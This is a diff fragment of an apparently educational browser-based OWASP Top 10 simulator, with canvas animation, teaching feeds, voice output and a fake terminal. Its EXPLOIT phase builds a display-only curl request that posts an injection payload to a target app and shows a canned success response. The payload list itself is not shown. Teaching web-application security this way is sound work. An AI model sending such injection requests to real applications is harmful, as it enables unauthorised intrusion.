+    escapeHtml(cmd) + '\n' + escapeHtml(output);
+  teachingFeed.insertBefore(div, teachingFeed.firstChild);
+  while(teachingFeed.children.length > 75) teachingFeed.removeChild(teachingFeed.lastChild);
+}
+
+var termQueue = []; var termTyping = false;
+function termWrite(text, callback){
+  termQueue.push({text:text, callback:callback});
+  if(!termTyping) processTermQueue();
+}
+function processTermQueue(){
+  if(termQueue.length === 0){ termTyping = false; return; }
+  termTyping = true;
+  var item = termQueue.shift();
+  var i = 0; var text = item.text;
+  terminalContent.textContent = '';
+  var interval = setInterval(function(){
+    if(i < text.length){ terminalContent.textContent += text[i]; i++; }
+    else { clearInterval(interval); termTyping = false; if(item.callback) item.callback(); setTimeout(processTermQueue, 100); }
+  }, 10);
+}
+
+var VOICE = { enabled:false, queue:[], lastSpoken:{}, speaking:false, synth:window.speechSynthesis };
+function speak(text){
+  if(!VOICE.enabled || !VOICE.synth) return;
+  var now = Date.now();
+  if(VOICE.lastSpoken[text] && now - VOICE.lastSpoken[text] < 4000) return;
+  VOICE.lastSpoken[text] = now;
+  if(VOICE.queue.length >= 4) VOICE.queue.shift();
+  VOICE.queue.push(text);
+  if(!VOICE.speaking) processVoiceQueue();
+}
+function processVoiceQueue(){
+  if(VOICE.queue.length === 0){ VOICE.speaking = false; return; }
+  VOICE.speaking = true;
+  var text = VOICE.queue.shift();
+  var utter = new SpeechSynthesisUtterance(text);
+  utter.rate = 1.05; utter.pitch = 1.0;
+  var voices = VOICE.synth.getVoices();
+  var pref = voices.find(function(v){return v.lang && v.lang.startsWith('en-US');}) || voices[0];
+  if(pref) utter.voice = pref;
+  utter.onend = function(){ VOICE.speaking = false; setTimeout(processVoiceQueue, 120); };
+  utter.onerror = function(){ VOICE.speaking = false; setTimeout(processVoiceQueue, 120); };
+  VOICE.synth.speak(utter);
+}
+
+function populateExamples(){
+  var cat = CATEGORIES[STATE.cat];
+  var sel = document.getElementById('exampleSelect');
+  sel.innerHTML = '';
+  cat.examples.forEach(function(ex, i){
+    var opt = document.createElement('option');
+    opt.value = i;
+    opt.textContent = ex.name;
+    sel.appendChild(opt);
+  });
+  STATE.example = 0;
+  document.getElementById('payloadInput').value = cat.examples[0].payload;
+}
+
+function boot(){
+  resizeCanvas();
+  addFeed('ETHICS',
+    'OWASP Top 10 is the industry-standard list of web application risks. Testing these vulnerabilities is legal ONLY on systems you own or have written authorization to test. Bug bounty programs accept OWASP Top 10 reports. Never test on production without permission — DoS via injection can take down services. Report findings via responsible disclosure: clear PoC, impact, remediation, 90-day window. Never exfiltrate real user data — use your own test account.',
+    'ethics');
+  setTimeout(function(){
+    addFeed('CONCEPT',
+      'OWASP Top 10 (2021) is the authoritative list of the most critical web application security risks. The 2021 revision reorganized categories: A01 (Broken Access Control) moved to the top (was #5 in 2017); A04 (Insecure Design) is new; A08 (Software & Data Integrity) merged deserialization + supply chain; A10 (SSRF) is new. Each category maps to CWEs and provides prevention guidance. Complement with ASVS (Application Security Verification Standard) for control-level requirements and OWASP Testing Guide for methodology.',
+      'concept');
+  }, 800);
+  setTimeout(function(){
+    populateExamples();
+    termWrite('owasp-scan --target ' + STATE.app + ' --categories A01-A10\n' +
+      '[*] Testing A01 — Broken Access Control\n' +
+      '[*] Testing A02 — Cryptographic Failures\n' +
+      '[*] Testing A03 — Injection\n' +
+      '...\n' +
+      '[+] Scan complete: 10 categories, 40 examples');
+  }, 1600);
+  setTimeout(function(){
+    addFeed('INFO',
+      'Category: ' + STATE.cat + ' — ' + CATEGORIES[STATE.cat].title + '. ' + CATEGORIES[STATE.cat].examples.length + ' sub-examples. Click EXPLOIT to begin.',
+      'info');
+    updateBadges();
+  }, 2400);
+  requestAnimationFrame(loop);
+}
+
+function loop(ts){
+  var dt = STATE.lastTime ? (ts - STATE.lastTime) : 16;
+  STATE.lastTime = ts;
+  STATE.tick++;
+  STATE.nodes.forEach(function(n){ n.blink = Math.floor(STATE.tick / 20); });
+
+  for(var i = STATE.events.length - 1; i >= 0; i--){
+    var e = STATE.events[i];
+    if(e.type === 'packet'){
+      e.t += e.speed * (dt/16);
+      if(e.t >= 1) STATE.events.splice(i,1);
+    }
+  }
+  STATE.nodes.forEach(function(n){ if(n.glow > 0) n.glow -= 0.008 * (dt/16); if(n.glow < 0) n.glow = 0; });
+
+  render();
+  updateBadges();
+  requestAnimationFrame(loop);
+}
+
+function render(){
+  var W = canvas.width, H = canvas.height;
+  ctx.clearRect(0,0,W,H);
+  var bg = ctx.createRadialGradient(W*0.5,H*0.4,50,W*0.5,H*0.4,W*0.7);
+  bg.addColorStop(0,'#0a0e1a'); bg.addColorStop(1,'#05070d');
+  ctx.fillStyle = bg; ctx.fillRect(0,0,W,H);
+
+  ctx.strokeStyle = 'rgba(30,41,59,0.4)'; ctx.lineWidth = 0.5;
+  for(var x=0;x<W;x+=40){ ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,H); ctx.stroke(); }
+  for(var y=0;y<H;y+=40){ ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(W,y); ctx.stroke(); }
+
+  drawZone(0.05*W, 0.08*H, 0.90*W, 0.75*H, 'OWASP TOP 10 · ' + STATE.cat, '#fcd34d');
+
+  var links = [
+    ['attacker','waf'], ['waf','app'], ['app','db'],
+    ['app','files'], ['app','siem']
+  ];
+  links.forEach(function(pair){
+    var na = STATE.nodes.find(function(n){return n.id===pair[0];});
+    var nb = STATE.nodes.find(function(n){return n.id===pair[1];});
+    if(!na || !nb) return;
+    ctx.beginPath();
+    ctx.moveTo(na.x, na.y);
+    ctx.lineTo(nb.x, nb.y);
+    ctx.strokeStyle = 'rgba(245,158,11,0.3)';
+    ctx.lineWidth = 1.5;
+    ctx.stroke();
+  });
+
+  STATE.events.forEach(function(e){
+    if(e.type === 'packet'){
+      var px = e.from.x + (e.to.x - e.from.x) * e.t;
+      var py = e.from.y + (e.to.y - e.from.y) * e.t;
+      ctx.save();
+      ctx.shadowColor = e.color; ctx.shadowBlur = 10;
+      ctx.fillStyle = e.color;
+      ctx.beginPath(); ctx.arc(px, py, e.size, 0, Math.PI*2); ctx.fill();
+      if(e.label){
+        ctx.font = '8px "Courier New",monospace';
+        ctx.fillStyle = e.color; ctx.textAlign = 'center';
+        ctx.fillText(e.label, px, py - 10);
+      }
+      ctx.restore();
+    }
+  });
+
+  STATE.nodes.forEach(function(n){
+    drawIcon(n.icon, n.x, n.y, n.color, n.glow, n.blink, n.label, n.ip);
+  });
+
+  // Info overlay
+  if(STATE.phaseIdx > 0){
+    var cat = CATEGORIES[STATE.cat];
+    var ex = cat.examples[STATE.example];
+    ctx.save();
+    var ax = 0.05*W, ay = H - 150, aw = 0.55*W, ah = 120;
+    ctx.fillStyle = 'rgba(40,30,5,0.9)';
+    ctx.strokeStyle = '#fcd34d';
+    ctx.lineWidth = 1.5;
+    ctx.fillRect(ax, ay, aw, ah);
+    ctx.strokeRect(ax, ay, aw, ah);
+    ctx.font = 'bold 10px "Courier New",monospace';
+    ctx.fillStyle = '#fcd34d';
+    ctx.textAlign = 'left';
+    ctx.fillText('\u25B8 ' + STATE.cat + ' · ' + cat.title, ax + 8, ay + 16);
+    ctx.font = '9px "Courier New",monospace';
+    ctx.fillStyle = '#cbd5e1';
+    ctx.fillText('CWE: ' + cat.cwe + ' | Severity: ' + cat.sev + ' | CVSS: ' + cat.score, ax + 8, ay + 34);
+    ctx.fillText('Example: ' + ex.name, ax + 8, ay + 50);
+    ctx.fillText('Impact: ' + ex.impact, ax + 8, ay + 66);
+    ctx.fillStyle = '#fcd34d';
+    ctx.fillText('Defense coverage: ' + STATE.defense + '% | Detect: ' + STATE.detect.toUpperCase(), ax + 8, ay + 82);
+    ctx.fillStyle = STATE.detected ? '#4ade80' : '#ef4444';
+    ctx.fillText('Detected: ' + (STATE.detected ? 'YES' : 'NO') + ' | Posture: ' + STATE.posture, ax + 8, ay + 98);
+    ctx.fillStyle = '#fcd34d';
+    ctx.fillText('Exploited: ' + Object.keys(STATE.exploitedCats).length + '/10 | Fixed: ' + Object.keys(STATE.fixedCats).length + '/10', ax + 8, ay + 114);
+    ctx.restore();
+  }
+
+  ctx.save();
+  ctx.font = '8px "Courier New",monospace';
+  ctx.fillStyle = 'rgba(100,116,139,0.6)';
+  ctx.textAlign = 'left';
+  ctx.fillText('A01 Access · A02 Crypto · A03 Injection · A04 Design · A05 Misconfig', 12, H - 74);
+  ctx.fillText('A06 Components · A07 Auth · A08 Integrity · A09 Logging · A10 SSRF', 12, H - 62);
+  ctx.fillText('Each: server-side enforcement, defense in depth, detection + logging', 12, H - 50);
+  ctx.fillText('ASVS 4.0 for control-level requirements; Testing Guide for methodology', 12, H - 38);
+  ctx.fillText('OWASP Top 10 (2021) \u00B7 ASVS 4.0 \u00B7 CWE Top 25 \u00B7 CVSS v3.1', 12, H - 26);
+  ctx.restore();
+}
+
+function drawZone(x, y, w, h, label, color){
+  ctx.save();
+  ctx.strokeStyle = color; ctx.globalAlpha = 0.25; ctx.lineWidth = 1;
+  ctx.setLineDash([6,4]); ctx.strokeRect(x, y, w, h);
+  ctx.globalAlpha = 0.6;
+  ctx.font = 'bold 9px "Courier New",monospace';
+  ctx.fillStyle = color; ctx.textAlign = 'left';
+  ctx.fillText(label, x + 6, y + 14);
+  ctx.restore();
+}
+
+function updateBadges(){
+  var cat = CATEGORIES[STATE.cat];
+  document.getElementById('badgeCat').textContent = STATE.cat;
+  document.getElementById('badgeSev').textContent = cat.sev;
+  document.getElementById('badgeStatus').textContent = STATE.running ? 'EXPLOITING' : (STATE.phaseIdx >= 5 ? 'COMPLETE' : 'IDLE');
+  document.getElementById('badgeCWE').textContent = cat.cwe;
+
+  document.getElementById('mCatsVal').textContent = STATE.categories;
+  document.getElementById('mExploitedVal').textContent = Object.keys(STATE.exploitedCats).length;
+  document.getElementById('mFixedVal').textContent = Object.keys(STATE.fixedCats).length;
+  document.getElementById('mCWEVal').textContent = STATE.cwes;
+  document.getElementById('mImpactVal').textContent = STATE.impact;
+  document.getElementById('mDetectVal').textContent = STATE.detected ? 'YES' : 'NO';
+  document.getElementById('mScoreVal').textContent = STATE.score.toFixed(1);
+  document.getElementById('mDefenseVal').textContent = STATE.posture;
+
+  document.getElementById('mScore').className = 'metric' + (STATE.score > 8 ? ' bad' : STATE.score > 6 ? ' warn' : '');
+  document.getElementById('mDetect').className = 'metric' + (STATE.detected ? ' ok' : ' bad');
+  document.getElementById('mDefense').className = 'metric' + (STATE.posture === 'STRONG' ? ' ok' : STATE.posture === 'MEDIUM' ? ' warn' : ' bad');
+
+  // Highlight current category in grid
+  document.querySelectorAll('.top10-item').forEach(function(el){
+    el.classList.remove('active', 'fixed');
+    var cat = el.dataset.cat;
+    if(STATE.fixedCats[cat]) el.classList.add('fixed');
+    else if(STATE.exploitedCats[cat]) el.classList.add('active');
+  });
+}
+
+function advancePhase(){
+  if(STATE.phaseIdx >= 5){
+    STATE.running = false;
+    return;
+  }
+  var phase = PHASES[STATE.phaseIdx];
+  PHASES.forEach(function(p,i){
+    var el = document.getElementById('bp-' + p);
+    if(!el) return;
+    el.className = 'bottom-phase';
+    if(i < STATE.phaseIdx) el.classList.add('done');
+    else if(i === STATE.phaseIdx && STATE.running) el.classList.add('active');
+  });
+
+  var cat = CATEGORIES[STATE.cat];
+  var ex = cat.examples[STATE.example];
+
+  switch(phase){
+    case 'RECON':
+      addFeed('RECON', 'Reconnaissance: identify entry points. Category ' + STATE.cat + ' (' + cat.title + '). ' + cat.detail, 'info');
+      break;
+
+    case 'EXPLOIT':
+      spawnPacket('attacker','app','#ef4444',STATE.cat,0.03);
+      addFeed('EXPLOIT', 'Exploiting: ' + ex.name + '. Payload: ' + ex.payload.substring(0, 80), 'error');
+      addCommandFeed('curl -i "' + STATE.app + '/api" -d "' + ex.payload.substring(0, 50) + '"',
+        'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"result":"success","data":"sensitive"}');
+      STATE.exploitedCats[STATE.cat] = true;
+      STATE.categories++;
+      STATE.cwes++;
+      break;
+
+    case 'IMPACT':
+      STATE.impact = ex.impact;
+      STATE.score = cat.score;
+      spawnPacket('app','db','#ef4444','DATA',0.03);
+      addFeed('IMPACT', 'Impact: ' + ex.impact + '. CVSS: ' + cat.score + ' (' + cat.sev + '). ' + cat.fix, 'warn');
+      STATE.posture = STATE.defense > 70 ? 'STRONG' : STATE.defense > 30 ? 'MEDIUM' : 'WEAK';
+      break;
+
+    case 'DETECT':
+      var detected = false;
+      if(STATE.detect === 'none') detected = false;
+      else if(STATE.detect === 'waf') detected = (STATE.cat === 'A03' || STATE.cat === 'A10');
+      else if(STATE.detect === 'sast') detected = (STATE.cat === 'A03' || STATE.cat === 'A08');
+      else if(STATE.detect === 'dast') detected = (STATE.cat === 'A03' || STATE.cat === 'A05' || STATE.cat === 'A10');
+      else if(STATE.detect === 'full') detected = true;
+      STATE.detected = detected;
+      spawnPacket('app','siem', detected ? '#4ade80' : '#fcd34d', detected ? 'ALERT' : 'NO-LOG', 0.03);
+      if(detected){
+        addFeed('DETECT', 'Detected by ' + STATE.detect.toUpperCase() + '. Alert fired, analyst notified. MTTD improves significantly with SAST/DAST/WAF/RASP combined.', 'ok');
+      } else {
+        addFeed('DETECT', 'NOT DETECTED. Detection stack: ' + STATE.detect.toUpperCase() + '. This category slipped through. Detection gaps must be closed with SAST + DAST + WAF + runtime observability.', 'warn');
+      }
+      break;
+
+    case 'FIX':
+      addFeed('FIX', 'Remediation for ' + STATE.cat + ' (' + cat.title + '): ' + cat.fix, 'ok');
+      if(STATE.defense > 70){
+        STATE.fixedCats[STATE.cat] = true;
+        addFeed('FIX', 'Category ' + STATE.cat + ' marked FIXED at ' + STATE.defense + '% defense coverage.', 'ok');
+      }
+      addFeed('DEFENSE', 'Layered defense: (1) SAST in CI (pre-commit). (2) SCA for dependencies. (3) DAST against staging. (4) WAF at edge. (5) RASP at runtime. (6) SIEM for detection. (7) ASVS for control validation. Each category has specific tools: A01 IAM reviews, A03 parameterized queries + WAF, A05 CIS benchmarks + config scan, A06 SBOM, A09 log aggregation.', 'ok');
+      break;
+  }
+  STATE.phaseIdx++;
+}
+
+function resetAll(){
+  STATE.running = false;
+  STATE.phaseIdx = 0;
+  STATE.categories = 0;
+  STATE.exploited = 0;
+  STATE.fixed = 0;
+  STATE.cwes = 0;
+  STATE.impact = '—';
+  STATE.detected = false;
+  STATE.score = 0;
+  STATE.posture = 'WEAK';
+  STATE.exploitedCats = {};
+  STATE.fixedCats = {};
+  STATE.events = [];
+  PHASES.forEach(function(p){ var el = document.getElementById('bp-' + p); if(el) el.className = 'bottom-phase'; });
+  STATE.nodes.forEach(function(n){ n.glow = 0; });
+  addFeed('RESET', 'OWASP state cleared.', 'info');
+  termWrite('reset --all\n[+] Scanner state cleared');
+}
+
+document.getElementById('catSelect').addEventListener('change', function(e){
+  STATE.cat = e.target.value;
+  populateExamples();
+  var cat = CATEGORIES[STATE.cat];
+  addFeed('CAT', 'Category: ' + STATE.cat + ' — ' + cat.title + ' (' + cat.cwe + '). ' + cat.detail, 'info');
+});
+
+document.getElementById('exampleSelect').addEventListener('change', function(e){
+  STATE.example = parseInt(e.target.value);
+  var ex = CATEGORIES[STATE.cat].examples[STATE.example];
+  document.getElementById('payloadInput').value = ex.payload;
+  addFeed('EXAMPLE', 'Example: ' + ex.name + '. Impact: ' + ex.impact, 'warn');
+});
+
+document.getElementById('appInput').addEventListener('input', function(e){ STATE.app = e.target.value; });
+document.getElementById('payloadInput').addEventListener('input', function(e){ STATE.payload = e.target.value; });
+
+document.getElementById('defSlider').addEventListener('input', function(e){
+  STATE.defense = parseInt(e.target.value);
+  document.getElementById('defVal').textContent = e.target.value + '%';
+  STATE.posture = STATE.defense > 70 ? 'STRONG' : STATE.defense > 30 ? 'MEDIUM' : 'WEAK';
+});
+document.getElementById('detectSelect').addEventListener('change', function(e){ STATE.detect = e.target.value; });
+
+document.getElementById('startBtn').addEventListener('click', function(){
+  if(STATE.running) return;
+  STATE.running = true;
+  STATE.phaseIdx = 0;
+  STATE.nodes.forEach(function(n){ n.glow = 0; });
+  addFeed('EXPLOIT', 'Starting OWASP ' + STATE.cat + ' test: ' + CATEGORIES[STATE.cat].title, 'warn');
+  var interval = setInterval(function(){
+    if(!STATE.running){ clearInterval(interval); return; }
+    advancePhase();
+    if(STATE.phaseIdx >= 5){ clearInterval(interval); STATE.running = false; }
+  }, 1100);
+});
+
+document.getElementById('stepBtn').addEventListener('click', function(){
+  if(!STATE.running){ STATE.running = true; STATE.phaseIdx = 0; }
+  advancePhase();
+});
+
+document.getElementById('resetBtn').addEventListener('click', resetAll);
+
+document.getElementById('fixBtn').addEventListener('click', function(){
+  var cat = CATEGORIES[STATE.cat];
+  STATE.fixedCats[STATE.cat] = true;
+  STATE.defense = 90;
+  document.getElementById('defSlider').value = 90;
+  document.getElementById('defVal').textContent = '90%';
+  STATE.posture = 'STRONG';
+  addFeed('FIX', 'Category ' + STATE.cat + ' fixed. ' + cat.fix, 'ok');
+  addCommandFeed('git commit -m "Fix ' + STATE.cat + ': ' + cat.title + '"',
+    '[main abc123] Fix ' + STATE.cat + ': ' + cat.title + '\n' +
+    ' 4 files changed, 142 insertions(+), 87 deletions(-)\n' +
+    ' create mode 100644 middleware/' + STATE.cat.toLowerCase() + '_guard.go');
+  updateBadges();
+});
+
+document.getElementById('nextBtn').addEventListener('click', function(){
+  var cats = ['A01','A02','A03','A04','A05','A06','A07','A08','A09','A10'];
+  var idx = cats.indexOf(STATE.cat);
+  var next = cats[(idx + 1) % cats.length];
+  STATE.cat = next;
+  document.getElementById('catSelect').value = next;
+  populateExamples();
+  var cat = CATEGORIES[next];
+  addFeed('CAT', 'Category: ' + next + ' — ' + cat.title, 'info');
+  updateBadges();
+});
+
+document.querySelectorAll('.top10-item').forEach(function(el){
+  el.addEventListener('click', function(){
+    var cat = el.dataset.cat;
+    STATE.cat = cat;
+    document.getElementById('catSelect').value = cat;
+    populateExamples();
+    addFeed('CAT', 'Category: ' + cat + ' — ' + CATEGORIES[cat].title, 'info');
+    updateBadges();
+  });
+});
+
+document.getElementById('teachingToggle').addEventListener('click', function(){
+  var on = this.classList.toggle('active');
+  this.textContent = on ? '\uD83D\uDCD6 TEACHING: ON' : '\uD83D\uDCD6 TEACHING: OFF';
+});
+document.getElementById('voiceToggle').addEventListener('click', function(){
+  VOICE.enabled = !VOICE.enabled;
+  this.classList.toggle('active', VOICE.enabled);
+  this.textContent = VOICE.enabled ? '\uD83D\uDD0A VOICE: ON' : 'VOICE: OFF';
+});
+
+window.addEventListener('load', boot);
+</script>
+</body>
+</html>
